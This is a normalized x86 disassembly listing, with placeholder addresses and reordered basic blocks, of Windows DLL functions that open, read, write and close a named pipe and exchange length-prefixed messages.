cmp edi 0xffffffff
je r-xdata
cmp [ esi + 0x18 ] 0x8
lea eax [ esi + 0x4 ]
jb r-xdata
mov edi [ esi + 0x1c ]
cmp edi 0xffffffff
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x8
push [ esi + 0x1c ]
call [ CloseHandle@IAT ]
mov [ esi + 0x1c ] 0xffffffff
xor ebx ebx
jmp r-xdata
push 0x0
push 0x0
push 0x3
push 0x0
push 0x0
push 0xc0000000
push eax
call [ CreateFileW@IAT ]
mov [ esi + 0x1c ] eax
cmp eax 0xffffffff
jne r-xdata
mov eax [ eax ]
mov ecx [ ebp + 0x8 ]
cmp ebx [ ecx + 0x10 ]
jb r-xdata
mov ecx esi
call sub_100274d0
call [ GetLastError@IAT ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
sub_100273a0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x5a4
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x5a0 ] eax
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov ebx ecx
mov [ esp + 0x10 ] eax
lea esp [ esp ]
mov esi 0x4
sub esi eax
mov ecx edi
call sub_10003630
push [ eax ]
call [ ntohl@IAT ]
mov edx [ esp + 0x10 ]
mov ecx eax
and ecx 0xfffffff
shr eax 0x1c
mov [ edx ] eax
sub ecx [ edi + 0x10 ]
add ecx 0x4
cmp ecx esi
jae r-xdata
call [ GetLastError@IAT ]
push [ ebx + 0x1c ]
call [ CloseHandle@IAT ]
mov ecx [ esp + 0x5ac ]
xor eax eax
pop edi
pop esi
mov [ ebx + 0x1c ] 0xffffffff
pop ebx
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x8
push [ esp + 0x14 ]
lea eax [ esp + 0x1c ]
mov ecx edi
push eax
call sub_10005470
cmp [ edi + 0x10 ] 0x4
jb r-xdata
push ecx
mov ecx [ ebx + 0x1c ]
lea eax [ esp + 0x18 ]
push eax
push esi
lea edx [ esp + 0x24 ]
call sub_10026fe0
test eax eax
je r-xdata
mov esi ecx
jmp r-xdata
mov eax [ edi + 0x10 ]
mov esi 0x58b
mov [ esp + 0x14 ] 0x0
cmp eax 0x4
jb r-xdata
mov ecx edi
call sub_10003630
push [ eax ]
call [ ntohl@IAT ]
mov ecx [ esp + 0x10 ]
mov edx eax
and eax 0xfffffff
shr edx 0x1c
add eax 0x4
mov [ ecx ] edx
cmp [ edi + 0x10 ] eax
jne r-xdata
push 0x4
push 0x0
mov ecx edi
call sub_10001ae0
mov eax 0x1
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x5a0 ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x8
sub_100274d0
push ebp
mov ebp esp
push 0xffffffff
push sub_10050700
mov eax [ fs : 0x0 ]
push eax
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
push r--data
mov [ ebp - 0x48 ] r--data
call [ htonl@IAT ]
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x2c ] 0x0
mov [ ebp - 0x48 ] eax
mov [ ebp - 0x41 ] 0x1
mov [ ebp - 0x2c ] 0xf
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x40 ] 0x0
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x48 ]
push 0x4
push eax
lea ecx [ ebp - 0x40 ]
call sub_10005470
push 0x1
lea eax [ ebp - 0x41 ]
push eax
lea ecx [ ebp - 0x40 ]
call sub_10005470
push 0x0
lea eax [ ebp - 0x40 ]
mov ecx esi
push eax
call sub_100272b0
test eax eax
jne r-xdata
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x28 ]
mov ecx esi
push eax
call sub_100273a0
test eax eax
je r-xdata
xor esi esi
jmp r-xdata
push [ esi + 0x1c ]
call [ CloseHandle@IAT ]
mov [ esi + 0x1c ] 0xffffffff
xor esi esi
jmp r-xdata
test [ ebp - 0x4c ] 0x1
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x2c ] 0x10
jb r-xdata
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x14 ] 0x10
jb r-xdata
cmp [ ebp - 0x18 ] 0x5
jb r-xdata
mov [ ebp - 0x2c ] 0xf
mov eax esi
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x40 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn
push [ ebp - 0x40 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
push [ ebp - 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
mov ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x28 ]
mov edx [ ebp - 0x28 ]
cmp ecx 0x10
cmovae eax edx
cmp [ eax ] 0x1
je r-xdata
cmp ecx 0x10
lea eax [ ebp - 0x28 ]
cmovae eax edx
push [ eax + 0x1 ]
call [ ntohl@IAT ]
mov [ esi + 0x20 ] eax
mov esi 0x1
sub_10027690
push ebp
mov ebp esp
push 0xffffffff
push sub_1005073b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ esi - 0xc ]
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0xc ] r--data
mov eax [ esi - 0xc ]
mov edx [ eax + 0x4 ]
lea eax [ edx - 0xc ]
mov [ edx + esi - 0x10 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi - 0xc ]
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0xc ] r--data
mov eax [ esi - 0xc ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x8 ]
mov [ ecx + esi - 0x10 ] eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
sub_10027720
push ebp
mov ebp esp
push 0xffffffff
push sub_1005076b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
lea edi [ ecx - 0xc ]
mov eax [ edi ]
lea esi [ edi + 0xc ]
mov [ ebp - 0x10 ] esi
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0xc ] r--data
mov eax [ esi - 0xc ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0xc ]
mov [ ecx + esi - 0x10 ] eax
mov [ ebp - 0x4 ] 0xffffffff
test [ ebp + 0x8 ] 0x1
mov eax [ esi - 0xc ]
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0xc ] r--data
mov eax [ esi - 0xc ]
mov edx [ eax + 0x4 ]
lea ecx [ edx - 0x8 ]
mov [ edx + esi - 0x10 ] ecx
mov [ esi ] r--data
je r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
push edi
call j_sub_1003f3e3#2
add esp 0x4
sub_100277c0
push ebp
mov ebp esp
push 0xffffffff
push sub_100507cd
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x18 ] r--data
mov [ ebp - 0x4 ] 0x0
mov eax [ esi ]
mov [ ebp - 0x10 ] 0x1
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x8 ]
mov [ ecx + esi - 0x4 ] eax
mov [ ebp - 0x4 ] 0x3
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0xc ]
mov [ ecx + esi - 0x4 ] eax
mov [ esi + 0x4 ] 0xb
mov [ ebp - 0x4 ] 0x4
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x18 ]
mov [ ecx + esi - 0x4 ] eax
mov [ esi + 0x8 ] 0x0
mov [ esi + 0xc ] 0x0
mov [ esi + 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x5
mov ax [ ebp + 0x8 ]
test ax ax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ esi + 0x10 ]
sub ecx [ esi + 0x8 ]
movzx edi ax
mov eax 0x2aaaaaab
imul ecx
sar edx 0x2
mov eax edx
shr eax 0x1f
add eax edx
cmp eax edi
jae r-xdata
cmp edi 0xaaaaaaa
jbe r-xdata
push edi
lea ecx [ esi + 0x8 ]
call sub_10027ac0
push r--data
call sub_1003c5be
sub_100278f0
push ebp
mov ebp esp
push esi
push edi
lea edi [ ecx - 0x18 ]
lea ecx [ edi + 0x18 ]
call sub_10027920
test [ ebp + 0x8 ] 0x1
mov [ edi + 0x18 ] r--data
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
push edi
call j_sub_1003f3e3#2
add esp 0x4
sub_10027920
push ebp
mov ebp esp
push 0xffffffff
push sub_10050811
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ esi - 0x18 ]
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x18 ] r--data
mov eax [ esi - 0x18 ]
mov edx [ eax + 0x4 ]
lea eax [ edx - 0x18 ]
mov [ edx + esi - 0x1c ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ esi - 0x10 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
lea edx [ esi - 0xc ]
mov eax [ edx - 0xc ]
mov [ ebp - 0x10 ] edx
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0xc ] r--data
mov eax [ edx - 0xc ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0xc ]
mov [ ecx + edx - 0x10 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ edx - 0xc ]
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0xc ] r--data
mov eax [ edx - 0xc ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x8 ]
mov [ ecx + edx - 0x10 ] eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push eax
call j_sub_1003f3e3#2
add esp 0x4
mov [ esi - 0x10 ] 0x0
mov [ esi - 0xc ] 0x0
mov [ esi - 0x8 ] 0x0
sub_100279f0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b881
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ esi + 0x4 ]
mov edi [ ebp + 0x8 ]
cmp edi ecx
jae r-xdata
cmp ecx [ esi + 0x8 ]
jne r-xdata
mov eax [ esi ]
cmp eax edi
ja r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push ecx
mov ecx esi
call sub_10027bb0
sub edi eax
mov eax 0x2aaaaaab
imul edi
sar edx 0x2
mov edi edx
shr edi 0x1f
add edi edx
cmp ecx [ esi + 0x8 ]
jne r-xdata
add [ esi + 0x4 ] 0x18
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
movdqu xmm0 [ edi ]
movdqu [ eax ] xmm0
movq xmm0 [ edi + 0x10 ]
movq [ eax + 0x10 ] xmm0
mov eax [ esi ]
lea ecx [ edi + edi * 2 ]
lea ecx [ eax + ecx * 8 ]
mov eax [ esi + 0x4 ]
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
push ecx
mov ecx esi
call sub_10027bb0
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
movdqu xmm0 [ ecx ]
movdqu [ eax ] xmm0
movq xmm0 [ ecx + 0x10 ]
movq [ eax + 0x10 ] xmm0
sub_10027ac0
push ebp
mov ebp esp
push 0xffffffff
push sub_10050830
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx ecx
xor esi esi
mov [ ebp - 0x14 ] esi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
sub esp 0x8
push esi
mov edx [ ebx + 0x4 ]
mov ecx [ ebx ]
call sub_10027c50
add esp 0x10
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebx + 0x4 ]
sub ecx [ ebx ]
mov eax 0x2aaaaaab
imul ecx
sar edx 0x2
mov ecx edx
shr ecx 0x1f
add ecx edx
mov [ ebp + 0x8 ] ecx
mov eax [ ebx ]
test eax eax
je r-xdata
cmp edi 0xaaaaaaa
ja r-xdata
lea eax [ edi + edi * 2 ]
lea eax [ esi + eax * 8 ]
mov [ ebx + 0x8 ] eax
lea eax [ ecx + ecx * 2 ]
lea eax [ esi + eax * 8 ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push eax
call j_sub_1003f3e3#2
add esp 0x4
mov ecx [ ebp + 0x8 ]
call sub_1003c58d
lea eax [ edi + edi * 2 ]
shl eax 0x3
push eax
call sub_1003cdeb
add esp 0x4
mov esi eax
mov [ ebp - 0x14 ] esi
test esi esi
jne r-xdata
sub_10027bb0
push esi
mov esi [ ecx + 0x4 ]
mov eax 0x2aaaaaab
push edi
mov edi [ ecx + 0x8 ]
mov edx edi
sub edx esi
imul edx
sar edx 0x2
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
jae r-xdata
pop edi
pop esi
retn 0x4
sub esi [ ecx ]
mov eax 0x2aaaaaab
imul esi
push ebx
sar edx 0x2
mov ebx 0xaaaaaaa
mov esi edx
mov eax ebx
shr esi 0x1f
add esi edx
sub eax esi
cmp eax 0x1
jb r-xdata
push r--data
call sub_1003c5be
sub edi [ ecx ]
mov eax 0x2aaaaaab
imul edi
inc esi
sar edx 0x2
mov eax edx
shr eax 0x1f
add eax edx
mov edx eax
shr edx 0x1
sub ebx edx
cmp ebx eax
pop ebx
jae r-xdata
add eax edx
cmp eax esi
cmovb eax esi
push eax
call sub_10027ac0
xor eax eax
cmp eax esi
cmovb eax esi
push eax
call sub_10027ac0
pop edi
pop esi
retn 0x4
sub_10027c50
push ebp
mov ebp esp
push 0xffffffff
push sub_10050861
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x0
add eax 0x18
mov [ ebp + 0x8 ] eax
add ecx 0x18
mov [ ebp - 0x18 ] ecx
jmp r-xdata
movdqu xmm0 [ ecx ]
movdqu [ eax ] xmm0
movq xmm0 [ ecx + 0x10 ]
movq [ eax + 0x10 ] xmm0
cmp ecx edx
je r-xdata
sub_10027d40
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_10027d80
push ebp
mov ebp esp
push 0xffffffff
push sub_100508b9
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
lea eax [ esi + 0x8 ]
mov [ esi ] r--data
mov [ ebp - 0x14 ] eax
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x0
xorps xmm0 xmm0
mov [ eax ] r--data
mov [ eax + 0x4 ] 0x0
movdqu [ eax + 0x8 ] xmm0
movq [ eax + 0x18 ] xmm0
mov [ ebp - 0x4 ] 0x1
lea ecx [ esi + 0x30 ]
push ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
call sub_1001c850
mov [ ebp - 0x4 ] 0x4
mov [ esi + 0x58 ] 0xf
mov [ esi + 0x54 ] 0x0
mov [ esi + 0x44 ] 0x0
mov [ ebp - 0x4 ] 0x5
mov eax [ ebp + 0x8 ]
mov [ esi + 0x28 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0x2c ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
mov [ esi + 0x5c ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0xc
sub_10027e50
push ebp
mov ebp esp
push 0xffffffff
push sub_10050941
mov eax [ fs : 0x0 ]
push eax
sub esp 0x3c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov [ ebp - 0x3c ] ebx
mov [ ebx ] r--data
mov [ ebp - 0x4 ] 0x2
lea edi [ ebx + 0x8 ]
mov [ ebp - 0x38 ] edi
mov ecx edi
mov eax [ edi ]
call [ eax + 0x8 ]
mov [ ebp - 0x4 ] 0x3
cmp [ ebx + 0x40 ] 0x0
jbe r-xdata
mov ecx [ ebx + 0x5c ]
test ecx ecx
je r-xdata
lea eax [ ebp - 0x48 ]
push eax
lea ecx [ ebx + 0x30 ]
call sub_1001c6b0
mov edx eax
mov eax [ edx ]
test eax eax
je r-xdata
push [ ebx + 0x28 ]
call [ DisconnectNamedPipe@IAT ]
push [ ebx + 0x28 ]
call [ CloseHandle@IAT ]
mov [ ebp - 0x4 ] 0x2
mov ecx edi
mov eax [ edi ]
call [ eax + 0xc ]
mov [ ebp - 0x4 ] 0x1
cmp [ ebx + 0x58 ] 0x10
jb r-xdata
mov ecx [ ecx + 0x8 ]
test ecx ecx
je r-xdata
mov ecx [ eax + 0x8 ]
mov eax [ eax + 0x4 ]
dec ecx
and ecx [ edx + 0x8 ]
push 0xffffffff
push 0x0
mov esi [ eax + ecx * 4 ]
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] 0x0
push esi
mov [ ebp - 0x1c ] 0xf
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
call sub_100018b0
mov [ ebp - 0x4 ] 0x4
mov eax [ esi + 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0x1c ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x5
mov ecx [ ebp - 0x14 ]
test ecx ecx
je r-xdata
mov eax [ eax ]
mov [ ebx + 0x58 ] 0xf
mov [ ebx + 0x54 ] 0x0
mov [ ebx + 0x44 ] 0x0
mov [ ebp - 0x4 ] 0x0
lea esi [ ebx + 0x30 ]
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x4 ] 0x9
mov ecx esi
call sub_1002a060
mov [ ebp - 0x4 ] 0x0
push [ esi ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esi ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x34 ] edi
mov [ edi ] r--data
mov [ ebp - 0x4 ] 0xa
cmp [ edi + 0x4 ] 0x0
je r-xdata
push [ ebx + 0x44 ]
call j_sub_1003f3e3#2
add esp 0x4
push [ ebx + 0x5c ]
call j_sub_1003f3e3#2
add esp 0x4
mov eax [ ecx ]
push 0x1
call [ eax ]
mov ecx [ ebx + 0x38 ]
mov eax [ ebx + 0x34 ]
dec ecx
and ecx [ ebx + 0x3c ]
mov esi [ eax + ecx * 4 ]
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x4 ] 0x5
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov [ ebp - 0x4 ] 0xffffffff
mov [ edi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn
lea eax [ edi + 0x8 ]
push eax
call [ DeleteCriticalSection@IAT ]
mov [ edi + 0x4 ] 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
dec [ ebx + 0x40 ]
jne r-xdata
push [ esi ]
call j_sub_1003f3e3#2
add esp 0x4
inc [ ebx + 0x3c ]
mov [ ebx + 0x3c ] 0x0
jmp r-xdata
cmp [ ebx + 0x40 ] 0x0
mov [ ebp - 0x1c ] 0xf
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
ja r-xdata
push [ ebp - 0x30 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x4 ] 0x3
cmp [ ebp - 0x1c ] 0x10
jb r-xdata
lea edi [ ebx + 0x8 ]
sub_10028080
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10050990
mov eax [ fs : 0x0 ]
push eax
sub esp 0x34
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x2c ] eax
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x40 ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov esi [ ebp + 0x8 ]
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x2c ] 0x0
mov [ esp + 0x2c ] 0xf
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x18 ] 0x0
mov [ esp + 0x48 ] 0x1
mov ecx esi
mov eax [ esi ]
mov [ esp + 0x30 ] 0x0
call [ eax + 0xc ]
mov ecx [ ebp + 0xc ]
shl ecx 0x1c
or ecx eax
push ecx
mov [ esp + 0x14 ] ecx
call [ htonl@IAT ]
mov [ esp + 0x10 ] eax
lea ecx [ esp + 0x18 ]
push 0x4
lea eax [ esp + 0x14 ]
push eax
call sub_10005470
mov [ esp + 0x34 ] esi
lea esi [ edi + 0x8 ]
mov [ esp + 0x14 ] esi
mov ecx esi
mov eax [ esi ]
call [ eax + 0x8 ]
mov [ esp + 0x48 ] 0x2
lea eax [ esp + 0x18 ]
push eax
lea ecx [ edi + 0x30 ]
call sub_10029f80
mov [ esp + 0x48 ] 0x1
mov ecx esi
mov eax [ esi ]
call [ eax + 0xc ]
mov [ esp + 0x48 ] 0xffffffff
cmp [ esp + 0x2c ] 0x10
jb r-xdata
mov [ esp + 0x2c ] 0xf
mov eax 0x1
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x18 ] 0x0
mov ecx [ esp + 0x40 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ esp + 0x2c ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x8
push [ esp + 0x18 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_100281b0
push ebp
mov ebp esp
push 0xffffffff
push sub_100509cb
mov eax [ fs : 0x0 ]
push eax
mov eax 0x4024
call sub_10048ab0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x401c ] edi
cmp [ edi + 0x40 ] 0x0
jbe r-xdata
mov ecx edi
call sub_100283c0
lea ebx [ edi + 0x30 ]
mov [ ebp - 0x4018 ] ebx
lea ecx [ ecx ]
mov eax [ esi + 0x8 ]
mov esi [ esi + 0x4 ]
dec eax
and eax [ ecx + 0x8 ]
mov esi [ esi + eax * 4 ]
cmp [ esi + 0x10 ] 0x0
jbe r-xdata
mov esi [ esi ]
mov ecx [ esi + 0x1c ]
mov eax [ ecx ]
call [ eax + 0xc ]
cmp [ esi + 0x18 ] eax
jae r-xdata
jmp r-xdata
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
lea esp [ esp ]
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov ecx [ ebx + 0x8 ]
mov eax [ ebx + 0x4 ]
dec ecx
and ecx [ ebx + 0xc ]
mov esi [ eax + ecx * 4 ]
mov [ ebp - 0x4024 ] esi
mov [ ebp - 0x4 ] 0xffffffff
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov ecx [ esi + 0x1c ]
lea eax [ ebp - 0x4010 ]
push edi
push eax
push ebx
mov edx [ ecx ]
call [ edx + 0x14 ]
mov edi [ ebp - 0x401c ]
lea ecx [ ebp - 0x4014 ]
push 0x0
push ecx
push eax
lea eax [ ebp - 0x4010 ]
mov [ ebp - 0x4014 ] 0x0
push eax
push [ edi + 0x28 ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov ecx [ esi + 0x1c ]
mov ebx [ esi + 0x18 ]
mov eax [ ecx ]
call [ eax + 0xc ]
mov edi eax
sub edi ebx
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
dec [ ebx + 0x10 ]
jne r-xdata
push [ esi ]
call j_sub_1003f3e3#2
add esp 0x4
call [ GetLastError@IAT ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4014 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4020 ]
test eax eax
je r-xdata
push 0x0
lea ecx [ ebp - 0x4020 ]
push ecx
push [ esi + 0x10 ]
push eax
push [ edi + 0x28 ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc [ ebx + 0xc ]
mov [ ebx + 0xc ] 0x0
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn
mov eax 0x1
jmp r-xdata
add [ esi + 0x18 ] eax
mov ecx [ esi + 0x1c ]
mov eax [ ecx ]
call [ eax + 0xc ]
cmp [ esi + 0x18 ] eax
jb r-xdata
push eax
push 0x0
mov ecx esi
call sub_10001ae0
cmp [ esi + 0x10 ] 0x0
ja r-xdata
lea eax [ ebp - 0x4030 ]
mov ecx ebx
push eax
call sub_1001c6b0
mov ecx eax
mov esi [ ecx ]
test esi esi
je r-xdata
cmp [ edi + 0x40 ] 0x0
ja r-xdata
mov ecx [ esi + 0x1c ]
mov edi 0x4000
mov ebx [ esi + 0x18 ]
mov eax [ ecx ]
call [ eax + 0xc ]
sub eax ebx
cmp eax edi
jae r-xdata
mov ebx [ ebp - 0x4018 ]
sub_100283c0
push ebp
mov ebp esp
push 0xffffffff
push sub_10050a27
mov eax [ fs : 0x0 ]
push eax
mov eax 0x401c
call sub_10048ab0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
cmp [ edi + 0x5c ] 0x0
jne r-xdata
mov ebx [ edi + 0x5c ]
test ebx ebx
je r-xdata
push 0x0
lea eax [ ebp - 0x4014 ]
mov [ ebp - 0x4014 ] 0x0
push eax
mov eax 0x4
sub eax [ edi + 0x54 ]
push eax
lea eax [ ebp - 0x401c ]
push eax
push [ edi + 0x28 ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
mov eax 0x1
lea ebx [ ebx ]
push [ ebp - 0x4014 ]
lea eax [ ebp - 0x401c ]
